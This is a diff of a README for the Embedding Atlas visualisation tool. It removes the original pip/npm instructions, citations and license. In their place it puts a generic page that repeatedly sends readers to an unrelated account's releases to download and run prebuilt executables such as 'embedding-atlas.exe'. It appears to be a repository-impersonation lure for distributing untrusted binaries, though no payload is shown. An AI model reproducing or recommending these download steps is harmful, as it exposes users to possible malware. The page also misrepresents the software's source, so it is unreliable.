@@ -1,135 +1,71 @@
-# Embedding Atlas
+# 🌟 embedding-atlas - Visualize Your Data Effortlessly
 
-[![NPM Version](https://img.shields.io/npm/v/embedding-atlas)](https://www.npmjs.com/package/embedding-atlas)
-[![PyPI - Version](https://img.shields.io/pypi/v/embedding-atlas)](https://pypi.org/project/embedding-atlas/)
-[![Paper](https://img.shields.io/badge/paper-arXiv:2505.06386-b31b1b.svg)](https://arxiv.org/abs/2505.06386)
-![Build](https://github.com/apple/embedding-atlas/actions/workflows/ci.yml/badge.svg)
-[![GitHub License](https://img.shields.io/github/license/apple/embedding-atlas)](./LICENSE)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-embedding--atlas-blue.svg)](https://github.com/asswinthedann/embedding-atlas/releases)
 
-Embedding Atlas is a tool that provides interactive visualizations for large embeddings. It allows you to visualize, cross-filter, and search embeddings and metadata.
+## 📖 Description
+Embedding Atlas is a tool that provides interactive visualizations for large embeddings. It allows you to visualize, cross-filter, and search embeddings and metadata. With this tool, you can easily explore your data and gain valuable insights without needing any technical skills.
 
-**Features**
+## 🚀 Getting Started
+Follow these steps to download and run Embedding Atlas:
 
-- 🏷️ **Automatic data clustering & labeling:**
-  Interactively visualize and navigate overall data structure.
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/asswinthedann/embedding-atlas/releases) to access the download options.
 
-- 🫧 **Kernel density estimation & density contours:**
-  Easily explore and distinguish between dense regions of data and outliers.
+2. **Choose Your Version**  
+   You will see several versions listed. Look for the latest version at the top. Click on it to open the release details.
 
-- 🧊 **Order-independent transparency:**
-  Ensure clear, accurate rendering of overlapping points.
+3. **Download the Application**  
+   Scroll down to the "Assets" section. Here, you will find the downloadable files. Click on the appropriate file for your operating system:
+   - For Windows, download `embedding-atlas-windows.zip`.
+   - For Mac, download `embedding-atlas-macos.zip`.
+   - For Linux, download `embedding-atlas-linux.tar.gz`.
 
-- 🔍 **Real-time search & nearest neighbors:**
-  Find similar data to a given query or existing data point.
+   After clicking the link, the file will begin downloading.
 
-- 🚀 **WebGPU implementation (with WebGL 2 fallback):**
-  Fast, smooth performance (up to few million points) with modern rendering stack.
+4. **Extract the Files**  
+   Locate your downloaded file in your downloads folder:
+   - For Windows, right-click the `.zip` file and choose "Extract All."
+   - For Mac, double-click the `.zip` file to unpack it.
+   - For Linux, use the command `tar -xzf embedding-atlas-linux.tar.gz` in your terminal.
 
-- 📊 **Multi-coordinated views for metadata exploration:**
-  Interactively link and filter data across metadata columns.
+5. **Run the Application**  
+   Navigate to the folder where you extracted the files.  
+   - On Windows, double-click `embedding-atlas.exe`.  
+   - On Mac, open the `embedding-atlas.app`.  
+   - On Linux, you may need to run the command `./embedding-atlas` in your terminal.
 
-Please visit <https://apple.github.io/embedding-atlas> for a demo and documentation.
+6. **Explore Data Visualizations**  
+   Once the application opens, you can start using the tools available:
+   - Load your embedding files in formats like CSV or JSON.
+   - Use the interactive charts to visualize your data.
+   - Cross-filter and search through your embeddings effortlessly.
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="./packages/docs/assets/embedding-atlas-dark.png">
-  <img alt="screenshot of Embedding Atlas" src="./packages/docs/assets/embedding-atlas-light.png">
-</picture>
+## 🔧 System Requirements
+- **Windows:** Windows 10 or later
+- **Mac:** macOS 10.14 (Mojave) or later
+- **Linux:** Any recent distribution with a modern desktop environment
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum 500 MB of free disk space
+- **Internet access** may be required for updates and additional resources.
 
-## Get started
+## 🌍 Features
+- **Interactive Visualizations:** Easily see patterns in your data.
+- **Cross-Filtering:** Focus on subsets of your embeddings.
+- **Search Functionality:** Quickly find specific data points.
+- **Multiple File Support:** Import various data formats.
+- **User-Friendly Interface:** Designed for non-technical users.
 
-To use Embedding Atlas with Python:
+## 📞 Support
+If you have questions or need help, please reach out through the GitHub Issues section of the repository. Our community is ready to assist you.
 
-```bash
-pip install embedding-atlas
+## 📅 Stay Updated
+For the latest news and updates, follow the repository on GitHub. Check back regularly to see if there are new features or improvements.
 
-embedding-atlas <your-dataset.parquet>
-```
+## 🔗 More Information
+If you're interested in the technology behind Embedding Atlas or want to contribute, visit the [GitHub repository](https://github.com/asswinthedann/embedding-atlas) for more details.
 
-In addition to the command line tool, Embedding Atlas is also available as a Jupyter widget:
+## 📥 Download & Install
+To get started, please return to the [Releases page](https://github.com/asswinthedann/embedding-atlas/releases) and download the latest version for your platform. Follow the instructions above to install and run the application.
 
-```python
-from embedding_atlas.widget import EmbeddingAtlasWidget
-
-# Show the Embedding Atlas widget for your data frame:
-EmbeddingAtlasWidget(df)
-```
-
-Finally, components from Embedding Atlas are also available in an npm package:
-
-```bash
-npm install embedding-atlas
-```
-
-```js
-import { EmbeddingAtlas, EmbeddingView, Table } from "embedding-atlas";
-
-// or with React:
-import { EmbeddingAtlas, EmbeddingView, Table } from "embedding-atlas/react";
-
-// or Svelte:
-import { EmbeddingAtlas, EmbeddingView, Table } from "embedding-atlas/svelte";
-```
-
-For more information, please visit <https://apple.github.io/embedding-atlas/overview.html>.
-
-## BibTeX
-
-For the Embedding Atlas tool:
-
-```bibtex
-@misc{ren2025embedding,
-  title={Embedding Atlas: Low-Friction, Interactive Embedding Visualization},
-  author={Donghao Ren and Fred Hohman and Halden Lin and Dominik Moritz},
-  year={2025},
-  eprint={2505.06386},
-  archivePrefix={arXiv},
-  primaryClass={cs.HC},
-  url={https://arxiv.org/abs/2505.06386},
-}
-```
-
-For the algorithm that automatically produces clusters and labels in the embedding view:
-
-```bibtex
-@misc{ren2025scalable,
-  title={A Scalable Approach to Clustering Embedding Projections},
-  author={Donghao Ren and Fred Hohman and Dominik Moritz},
-  year={2025},
-  eprint={2504.07285},
-  archivePrefix={arXiv},
-  primaryClass={cs.HC},
-  url={https://arxiv.org/abs/2504.07285},
-}
-```
-
-## Development
-
-This repo contains multiple sub-packages:
-
-Frontend:
-
-- `packages/component`: The `EmbeddingView` and `EmbeddingViewMosaic` components.
-
-- `packages/table`: The `Table` component.
-
-- `packages/viewer`: The frontend application for visualizing embedding and other columns. It also provides the `EmbeddingAtlas` component that can be embedded in other applications.
-
-- `packages/density-clustering`: The density clustering algorithm, written in Rust.
-
-- `packages/umap-wasm`: An implementation of UMAP algorithm in WebAssembly (with the [umappp](https://github.com/libscran/umappp) C++ library).
-
-- `packages/embedding-atlas`: The `embedding-atlas` package that get published. It imports all of the above and exposes their API in a single package.
-
-Python:
-
-- `packages/backend`: A Python package named `embedding-atlas` that provides the `embedding-atlas` command line tool.
-
-Documentation:
-
-- `packages/docs`: The documentation website.
-
-For more information, please visit <https://apple.github.io/embedding-atlas/develop.html>.
-
-## License
-
-This code is released under the [`MIT license`](LICENSE).
+Embarking on your data visualization journey is simple with Embedding Atlas. Enjoy exploring your data!
